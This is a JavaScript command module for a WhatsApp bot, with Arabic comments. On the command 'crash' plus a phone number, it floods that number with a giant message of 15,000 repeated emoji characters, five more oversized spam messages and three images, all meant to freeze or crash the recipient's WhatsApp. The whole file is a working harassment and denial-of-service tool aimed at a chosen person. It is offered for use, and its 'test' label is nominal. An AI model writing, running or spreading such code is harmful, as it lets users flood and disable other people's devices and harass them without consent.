module.exports = async ({ text, reply, sock, msg, from }) => {
  if (!text) return;

  const parts = text.trim().split(/\s+/);
  const cmd = parts[0].toLowerCase();
  const targetNumber = parts[1]; // الرقم المستهدف

  if (cmd === 'crash') {
    if (!targetNumber) {
      return await reply('❌ الرجاء كتابة الأمر بهذا الشكل:\ncrash 966501234567');
    }

    // تحضير JID كامل
    const jid = targetNumber.includes('@s.whatsapp.net') ? targetNumber : `${targetNumber}@s.whatsapp.net`;

    try {
      // رسالة نصية ضخمة جداً (تهنيج)
      const heavyText = '⚠️❌🔥'.repeat(5000);
      await sock.sendMessage(jid, { text: `🚨 اختبار تهنيج واتساب 🚨\n${heavyText}` });

      // سبام 5 رسائل تهنيج
      for (let i = 1; i <= 5; i++) {
        await sock.sendMessage(jid, { text: `🚨 تهنيج رقم ${i} 🚨\n${'⚠️❌🔥'.repeat(3000)}` });
      }

      // إرسال 3 صور ثقيلة
      const heavyImageUrl = 'https://upload.wikimedia.org/wikipedia/commons/7/7d/Dark_Souls_III_logo.png';
      for (let i = 0; i < 3; i++) {
        await sock.sendMessage(jid, {
          image: { url: heavyImageUrl },
          caption: `⚠️ صورة تهنيج رقم ${i + 1}`,
        });
      }

      await reply(`✅ تم إرسال رسائل التهنيج بنجاح إلى الرقم: ${targetNumber}`);
    } catch (error) {
      await reply(`❌ حدث خطأ أثناء إرسال رسائل التهنيج:\n${error.message || error}`);
    }
  }
};
